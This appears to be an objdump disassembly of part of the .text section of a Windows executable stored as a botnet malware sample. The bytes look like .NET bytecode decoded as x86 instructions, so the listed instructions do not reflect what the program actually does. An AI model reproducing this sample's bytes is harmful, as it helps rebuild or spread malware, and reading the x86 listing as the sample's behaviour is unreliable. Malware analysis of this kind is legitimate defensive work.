
malware_samples/botnet/7a95e73032cb2cd22407c35cdd6b04b77dd9735c2b1931e9af03f526dc75d7c9.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 cd                	add    %cl,%ch
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 20 57 00    	add    %al,0x572000
  402013:	00 ac 75 00 00 01 00 	add    %ch,0x10000(%ebp,%esi,2)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1a 00                	sbb    (%eax),%al
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 12                	jle    0x402095
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 13                	jle    0x4020a5
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 14                	jle    0x4020b5
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 15                	jle    0x4020c5
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 16                	jle    0x4020d5
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 17                	jle    0x4020e5
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 18                	jle    0x4020f5
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 19                	jle    0x402105
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1b                	jle    0x40211d
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  40210d:	2a 2a                	sub    (%edx),%ch
  40210f:	02 28                	add    (%eax),%ch
  402111:	3e 00 00             	add    %al,%ds:(%eax)
  402114:	0a 16                	or     (%esi),%dl
  402116:	fe 03                	incb   (%ebx)
  402118:	2a 32                	sub    (%edx),%dh
  40211a:	7e 0b                	jle    0x402127
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 03                	add    $0x3,%al
  402120:	6f                   	outsl  %ds:(%esi),(%dx)
  402121:	3f                   	aas
  402122:	00 00                	add    %al,(%eax)
  402124:	0a 2a                	or     (%edx),%ch
  402126:	36 28 17             	sub    %dl,%ss:(%edi)
  402129:	00 00                	add    %al,(%eax)
  40212b:	06                   	push   %es
  40212c:	17                   	pop    %ss
  40212d:	58                   	pop    %eax
  40212e:	28 18                	sub    %bl,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	2a 2e                	sub    (%esi),%ch
  402135:	73 1a                	jae    0x402151
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40213f:	2a 32                	sub    (%edx),%dh
  402141:	7e 1c                	jle    0x40215f
  402143:	00 00                	add    %al,(%eax)
  402145:	04 02                	add    $0x2,%al
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	21 00                	and    %eax,(%eax)
  40214a:	00 0a                	add    %cl,(%edx)
  40214c:	2a 32                	sub    (%edx),%dh
  40214e:	7e 1c                	jle    0x40216c
  402150:	00 00                	add    %al,(%eax)
  402152:	04 02                	add    $0x2,%al
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40215a:	32 02                	xor    (%edx),%al
  40215c:	28 56 00             	sub    %dl,0x0(%esi)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	28 26                	sub    %ah,(%esi)
  402163:	00 00                	add    %al,(%eax)
  402165:	06                   	push   %es
  402166:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  40216c:	00 01                	add    %al,(%ecx)
  40216e:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402173:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402178:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  40217f:	63 d2                	arpl   %edx,%edx
  402181:	9c                   	pushf
  402182:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402187:	63 d2                	arpl   %edx,%edx
  402189:	9c                   	pushf
  40218a:	2a 4e 18             	sub    0x18(%esi),%cl
  40218d:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402191:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  402197:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40219c:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 28                	or     (%eax),%ch
  4021a7:	26 00 00             	add    %al,%es:(%eax)
  4021aa:	06                   	push   %es
  4021ab:	2a 2e                	sub    (%esi),%ch
  4021ad:	73 58                	jae    0x402207
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4021b7:	2a 56 02             	sub    0x2(%esi),%dl
  4021ba:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  4021bf:	04 02                	add    $0x2,%al
  4021c1:	28 1a                	sub    %bl,(%edx)
  4021c3:	00 00                	add    %al,(%eax)
  4021c5:	0a 02                	or     (%edx),%al
  4021c7:	03 7d 1d             	add    0x1d(%ebp),%edi
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	04 2a                	add    $0x2a,%al
  4021ce:	4a                   	dec    %edx
  4021cf:	02 7b 1d             	add    0x1d(%ebx),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 02                	add    $0x2,%al
  4021d6:	7b 1e                	jnp    0x4021f6
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	04 6f                	add    $0x6f,%al
  4021dc:	59                   	pop    %ecx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 2a                	or     (%edx),%ch
  4021e1:	8a 02                	mov    (%edx),%al
  4021e3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	04 17                	add    $0x17,%al
  4021ea:	58                   	pop    %eax
  4021eb:	7d 1e                	jge    0x40220b
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	04 02                	add    $0x2,%al
  4021f1:	7b 1e                	jnp    0x402211
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	04 02                	add    $0x2,%al
  4021f7:	7b 1d                	jnp    0x402216
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 6f                	add    $0x6f,%al
  4021fd:	5a                   	pop    %edx
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a fe                	or     %dh,%bh
  402202:	04 2a                	add    $0x2a,%al
  402204:	22 02                	and    (%edx),%al
  402206:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  40220b:	04 2a                	add    $0x2a,%al
  40220d:	56                   	push   %esi
  40220e:	02 28                	add    (%eax),%ch
  402210:	1a 00                	sbb    (%eax),%al
  402212:	00 0a                	add    %cl,(%edx)
  402214:	02 03                	add    (%ebx),%al
  402216:	7d 20                	jge    0x402238
  402218:	00 00                	add    %al,(%eax)
  40221a:	04 02                	add    $0x2,%al
  40221c:	04 7d                	add    $0x7d,%al
  40221e:	1f                   	pop    %ds
  40221f:	00 00                	add    %al,(%eax)
  402221:	04 2a                	add    $0x2a,%al
  402223:	32 02                	xor    (%edx),%al
  402225:	7b 20                	jnp    0x402247
  402227:	00 00                	add    %al,(%eax)
  402229:	04 6f                	add    $0x6f,%al
  40222b:	3f                   	aas
  40222c:	00 00                	add    %al,(%eax)
  40222e:	06                   	push   %es
  40222f:	2a 4e 02             	sub    0x2(%esi),%cl
  402232:	7b 20                	jnp    0x402254
  402234:	00 00                	add    %al,(%eax)
  402236:	04 6f                	add    $0x6f,%al
  402238:	3f                   	aas
  402239:	00 00                	add    %al,(%eax)
  40223b:	06                   	push   %es
  40223c:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402241:	00 06                	add    %al,(%esi)
  402243:	2a 4e 02             	sub    0x2(%esi),%cl
  402246:	7b 20                	jnp    0x402268
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 6f                	add    $0x6f,%al
  40224c:	3f                   	aas
  40224d:	00 00                	add    %al,(%eax)
  40224f:	06                   	push   %es
  402250:	25 03 6f 42 00       	and    $0x426f03,%eax
  402255:	00 06                	add    %al,(%esi)
  402257:	2a 4e 02             	sub    0x2(%esi),%cl
  40225a:	7b 20                	jnp    0x40227c
  40225c:	00 00                	add    %al,(%eax)
  40225e:	04 6f                	add    $0x6f,%al
  402260:	3f                   	aas
  402261:	00 00                	add    %al,(%eax)
  402263:	06                   	push   %es
  402264:	25 03 6f 53 00       	and    $0x536f03,%eax
  402269:	00 06                	add    %al,(%esi)
  40226b:	2a 36                	sub    (%esi),%dh
  40226d:	02 7b 1f             	add    0x1f(%ebx),%bh
  402270:	00 00                	add    %al,(%eax)
  402272:	04 03                	add    $0x3,%al
  402274:	6f                   	outsl  %ds:(%esi),(%dx)
  402275:	59                   	pop    %ecx
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 2a                	or     (%edx),%ch
  40227a:	32 02                	xor    (%edx),%al
  40227c:	7b 1f                	jnp    0x40229d
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 6f                	add    $0x6f,%al
  402282:	5a                   	pop    %edx
  402283:	00 00                	add    %al,(%eax)
  402285:	0a 2a                	or     (%edx),%ch
  402287:	66 02 03             	data16 add (%ebx),%al
  40228a:	7d 21                	jge    0x4022ad
  40228c:	00 00                	add    %al,(%eax)
  40228e:	04 02                	add    $0x2,%al
  402290:	02 7b 21             	add    0x21(%ebx),%bh
  402293:	00 00                	add    %al,(%eax)
  402295:	04 6f                	add    $0x6f,%al
  402297:	5b                   	pop    %ebx
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 7d 22             	or     0x22(%ebp),%bh
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 2a                	add    $0x2a,%al
  4022a1:	76 02                	jbe    0x4022a5
  4022a3:	7b 24                	jnp    0x4022c9
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 18                	add    $0x18,%al
  4022a9:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	02 18                	add    (%eax),%bl
  4022b3:	7d 24                	jge    0x4022d9
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	04 02                	add    $0x2,%al
  4022b9:	28 3a                	sub    %bh,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	2a 76 02             	sub    0x2(%esi),%dh
  4022c1:	7b 24                	jnp    0x4022e7
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	04 19                	add    $0x19,%al
  4022c7:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022cd:	00 06                	add    %al,(%esi)
  4022cf:	02 19                	add    (%ecx),%bl
  4022d1:	7d 24                	jge    0x4022f7
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 02                	add    $0x2,%al
  4022d7:	28 3a                	sub    %bh,(%edx)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	06                   	push   %es
  4022dc:	2a 1e                	sub    (%esi),%bl
  4022de:	02 28                	add    (%eax),%ch
  4022e0:	3e 00 00             	add    %al,%ds:(%eax)
  4022e3:	06                   	push   %es
  4022e4:	2a 52 02             	sub    0x2(%edx),%dl
  4022e7:	03 8c 51 00 00 01 7d 	add    0x7d010000(%ecx,%edx,2),%ecx
  4022ee:	23 00                	and    (%eax),%eax
  4022f0:	00 04 02             	add    %al,(%edx,%eax,1)
  4022f3:	1b 7d 24             	sbb    0x24(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	52                   	push   %edx
  4022fb:	02 03                	add    (%ebx),%al
  4022fd:	8c 52 00             	mov    %ss,0x0(%edx)
  402300:	00 01                	add    %al,(%ecx)
  402302:	7d 23                	jge    0x402327
  402304:	00 00                	add    %al,(%eax)
  402306:	04 02                	add    $0x2,%al
  402308:	1c 7d                	sbb    $0x7d,%al
  40230a:	24 00                	and    $0x0,%al
  40230c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40230f:	42                   	inc    %edx
  402310:	02 03                	add    (%ebx),%al
  402312:	7d 23                	jge    0x402337
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	1f                   	pop    %ds
  402319:	0b 7d 24             	or     0x24(%ebp),%edi
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 2a                	add    $0x2a,%al
  402320:	52                   	push   %edx
  402321:	02 28                	add    (%eax),%ch
  402323:	3e 00 00             	add    %al,%ds:(%eax)
  402326:	06                   	push   %es
  402327:	25 03 7d 21 00       	and    $0x217d03,%eax
  40232c:	00 04 04             	add    %al,(%esp,%eax,1)
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	4f                   	dec    %edi
  402331:	00 00                	add    %al,(%eax)
  402333:	06                   	push   %es
  402334:	2a 56 02             	sub    0x2(%esi),%dl
  402337:	28 3e                	sub    %bh,(%esi)
  402339:	00 00                	add    %al,(%eax)
  40233b:	06                   	push   %es
  40233c:	25 03 7d 21 00       	and    $0x217d03,%eax
  402341:	00 04 04             	add    %al,(%esp,%eax,1)
  402344:	6a 6f                	push   $0x6f
  402346:	42                   	inc    %edx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a f6                	sub    %dh,%dh
  40234c:	02 7b 23             	add    0x23(%ebx),%bh
  40234f:	00 00                	add    %al,(%eax)
  402351:	04 2c                	add    $0x2c,%al
  402353:	33 03                	xor    (%ebx),%eax
  402355:	1c 73                	sbb    $0x73,%al
  402357:	77 00                	ja     0x402359
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	25 02 7b 23 00       	and    $0x237b02,%eax
  402360:	00 04 74             	add    %al,(%esp,%esi,2)
  402363:	03 00                	add    (%eax),%eax
  402365:	00 1b                	add    %bl,(%ebx)
  402367:	16                   	push   %ss
  402368:	02 7b 23             	add    0x23(%ebx),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 74                	add    $0x74,%al
  40236f:	03 00                	add    (%eax),%eax
  402371:	00 1b                	add    %bl,(%ebx)
  402373:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402376:	4c                   	dec    %esp
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 25 6f 76 00 00    	or     0x766f,%ah
  40237f:	0a 6f 41             	or     0x41(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 17                	or     (%edi),%dl
  402386:	2a 16                	sub    (%esi),%dl
  402388:	2a 56 02             	sub    0x2(%esi),%dl
  40238b:	28 39                	sub    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  402397:	02 17                	add    (%edi),%dl
  402399:	7d 24                	jge    0x4023bf
  40239b:	00 00                	add    %al,(%eax)
  40239d:	04 2a                	add    $0x2a,%al
  40239f:	3e 02 03             	add    %ds:(%ebx),%al
  4023a2:	7d 23                	jge    0x4023c7
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	04 02                	add    $0x2,%al
  4023a8:	1a 7d 24             	sbb    0x24(%ebp),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 2a                	add    $0x2a,%al
  4023af:	6a 02                	push   $0x2
  4023b1:	7b 23                	jnp    0x4023d6
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	04 2d                	add    $0x2d,%al
  4023b7:	06                   	push   %es
  4023b8:	72 ed                	jb     0x4023a7
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	70 2a                	jo     0x4023e8
  4023be:	02 7b 23             	add    0x23(%ebx),%bh
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 6f                	add    $0x6f,%al
  4023c5:	38 00                	cmp    %al,(%eax)
  4023c7:	00 0a                	add    %cl,(%edx)
  4023c9:	2a 52 02             	sub    0x2(%edx),%dl
  4023cc:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  4023d1:	04 02                	add    $0x2,%al
  4023d3:	03 8c 5e 00 00 01 7d 	add    0x7d010000(%esi,%ebx,2),%ecx
  4023da:	23 00                	and    (%eax),%eax
  4023dc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023df:	56                   	push   %esi
  4023e0:	02 1f                	add    (%edi),%bl
  4023e2:	09 7d 24             	or     %edi,0x24(%ebp)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 02                	add    $0x2,%al
  4023e9:	03 8c 54 00 00 01 7d 	add    0x7d010000(%esp,%edx,2),%ecx
  4023f0:	23 00                	and    (%eax),%eax
  4023f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023f5:	52                   	push   %edx
  4023f6:	02 1e                	add    (%esi),%bl
  4023f8:	7d 24                	jge    0x40241e
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	03 8c 53 00 00 01 7d 	add    0x7d010000(%ebx,%edx,2),%ecx
  402405:	23 00                	and    (%eax),%eax
  402407:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40240a:	1e                   	push   %ds
  40240b:	02 28                	add    (%eax),%ch
  40240d:	50                   	push   %eax
  40240e:	00 00                	add    %al,(%eax)
  402410:	06                   	push   %es
  402411:	2a 22                	sub    (%edx),%ah
  402413:	02 03                	add    (%ebx),%al
  402415:	28 4f 00             	sub    %cl,0x0(%edi)
  402418:	00 06                	add    %al,(%esi)
  40241a:	2a 1e                	sub    (%esi),%bl
  40241c:	02 28                	add    (%eax),%ch
  40241e:	45                   	inc    %ebp
  40241f:	00 00                	add    %al,(%eax)
  402421:	06                   	push   %es
  402422:	2a 22                	sub    (%edx),%ah
  402424:	02 03                	add    (%ebx),%al
  402426:	28 42 00             	sub    %al,0x0(%edx)
  402429:	00 06                	add    %al,(%esi)
  40242b:	2a 1e                	sub    (%esi),%bl
  40242d:	02 28                	add    (%eax),%ch
  40242f:	46                   	inc    %esi
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	2a 22                	sub    (%edx),%ah
  402435:	02 03                	add    (%ebx),%al
  402437:	28 53 00             	sub    %dl,0x0(%ebx)
  40243a:	00 06                	add    %al,(%esi)
  40243c:	2a 1e                	sub    (%esi),%bl
  40243e:	02 7b 24             	add    0x24(%ebx),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 2a                	add    $0x2a,%al
  402445:	32 02                	xor    (%edx),%al
  402447:	7b 26                	jnp    0x40246f
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 73                	add    $0x73,%al
  40244d:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  402452:	4a                   	dec    %edx
  402453:	02 73 83             	add    -0x7d(%ebx),%dh
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 7d 26             	or     0x26(%ebp),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 02                	add    $0x2,%al
  40245f:	28 1a                	sub    %bl,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 2a                	or     (%edx),%ch
  402465:	3a 02                	cmp    (%edx),%al
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	7a 00                	jp     0x40246a
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	d2 02                	rolb   %cl,(%edx)
  40246e:	28 65 00             	sub    %ah,0x0(%ebp)
  402471:	00 06                	add    %al,(%esi)
  402473:	2a 32                	sub    (%edx),%dh
  402475:	02 20                	add    (%eax),%ah
  402477:	c0 00 00             	rolb   $0x0,(%eax)
  40247a:	00 6f 62             	add    %ch,0x62(%edi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	0a 2a                	or     (%edx),%ch
  402481:	6a 02                	push   $0x2
  402483:	20 cb                	and    %cl,%bl
  402485:	00 00                	add    %al,(%eax)
  402487:	00 6f 62             	add    %ch,0x62(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	0a 02                	or     (%edx),%al
  40248e:	03 28                	add    (%eax),%ebp
  402490:	2a 00                	sub    (%eax),%al
  402492:	00 06                	add    %al,(%esi)
  402494:	16                   	push   %ss
  402495:	1e                   	push   %ds
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	4c                   	dec    %esp
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 2a                	or     (%edx),%ch
  40249c:	7e 02                	jle    0x4024a0
  40249e:	20 ca                	and    %cl,%dl
  4024a0:	00 00                	add    %al,(%eax)
  4024a2:	00 6f 62             	add    %ch,0x62(%edi)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	0a 02                	or     (%edx),%al
  4024a9:	03 28                	add    (%eax),%ebp
  4024ab:	71 00                	jno    0x4024ad
  4024ad:	00 0a                	add    %cl,(%edx)
  4024af:	28 26                	sub    %ah,(%esi)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	06                   	push   %es
  4024b4:	16                   	push   %ss
  4024b5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 2a                	or     (%edx),%ch
  4024bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bd:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  4024c0:	02 20                	add    (%eax),%ah
  4024c2:	c3                   	ret
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 6f 62             	add    %ch,0x62(%edi)
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 2a                	or     (%edx),%ch
  4024cc:	02 20                	add    (%eax),%ah
  4024ce:	c2 00 00             	ret    $0x0
  4024d1:	00 6f 62             	add    %ch,0x62(%edi)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	aa                   	stos   %al,%es:(%edi)
  4024d9:	28 75 00             	sub    %dh,0x0(%ebp)
  4024dc:	00 06                	add    %al,(%esi)
  4024de:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4024e3:	00 06                	add    %al,(%esi)
  4024e5:	2d 15 28 77 00       	sub    $0x772815,%eax
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4024f1:	00 06                	add    %al,(%esi)
  4024f3:	2d 07 28 74 00       	sub    $0x742807,%eax
  4024f8:	00 06                	add    %al,(%esi)
  4024fa:	2c 06                	sub    $0x6,%al
  4024fc:	14 28                	adc    $0x28,%al
  4024fe:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402503:	56                   	push   %esi
  402504:	28 d0                	sub    %dl,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40250b:	00 00                	add    %al,(%eax)
  40250d:	0a 20                	or     (%eax),%ah
  40250f:	20 02                	and    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	d2 00                	rolb   %cl,(%eax)
  402516:	00 0a                	add    %cl,(%edx)
  402518:	2a 62 7e             	sub    0x7e(%edx),%ah
  40251b:	39 00                	cmp    %eax,(%eax)
  40251d:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402520:	10 7e 39             	adc    %bh,0x39(%esi)
  402523:	00 00                	add    %al,(%eax)
  402525:	04 6f                	add    $0x6f,%al
  402527:	df 00                	filds  (%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	14 80                	adc    $0x80,%al
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402532:	66 7e 0f             	data16 jle 0x402544
  402535:	00 00                	add    %al,(%eax)
  402537:	04 28                	add    $0x28,%al
  402539:	17                   	pop    %ss
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40253f:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  402545:	05 28 8b 00 00       	add    $0x8b28,%eax
  40254a:	06                   	push   %es
  40254b:	2a 56 72             	sub    0x72(%esi),%dl
  40254e:	83 26 00             	andl   $0x0,(%esi)
  402551:	70 7e                	jo     0x4025d1
  402553:	10 00                	adc    %al,(%eax)
  402555:	00 04 28             	add    %al,(%eax,%ebp,1)
  402558:	51                   	push   %ecx
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 80 3a 00 00 04    	or     0x400003a(%eax),%al
  402561:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  402567:	06                   	push   %es
  402568:	25 72 01 21 00       	and    $0x210172,%eax
  40256d:	70 6f                	jo     0x4025de
  40256f:	4d                   	dec    %ebp
  402570:	00 00                	add    %al,(%eax)
  402572:	06                   	push   %es
  402573:	72 2f                	jb     0x4025a4
  402575:	27                   	daa
  402576:	00 70 6f             	add    %dh,0x6f(%eax)
  402579:	5a                   	pop    %edx
  40257a:	00 00                	add    %al,(%eax)
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	57                   	push   %edi
  40257f:	00 00                	add    %al,(%eax)
  402581:	06                   	push   %es
  402582:	28 1e                	sub    %bl,(%esi)
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	20 e8                	and    %ch,%al
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 28                	add    %ch,(%eax)
  40258d:	14 00                	adc    $0x0,%al
  40258f:	00 0a                	add    %cl,(%edx)
  402591:	2a da                	sub    %dl,%bl
  402593:	73 62                	jae    0x4025f7
  402595:	00 00                	add    %al,(%eax)
  402597:	06                   	push   %es
  402598:	25 72 01 21 00       	and    $0x210172,%eax
  40259d:	70 6f                	jo     0x40260e
  40259f:	4d                   	dec    %ebp
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	06                   	push   %es
  4025a3:	72 41                	jb     0x4025e6
  4025a5:	27                   	daa
  4025a6:	00 70 6f             	add    %dh,0x6f(%eax)
  4025a9:	5a                   	pop    %edx
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	06                   	push   %es
  4025ad:	25 72 41 27 00       	and    $0x274172,%eax
  4025b2:	70 6f                	jo     0x402623
  4025b4:	4d                   	dec    %ebp
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 6f 5a             	add    0x5a(%edi),%ch
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bf:	57                   	push   %edi
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	28 1e                	sub    %bl,(%esi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	2a 2e                	sub    (%esi),%ch
  4025ca:	73 83                	jae    0x40254f
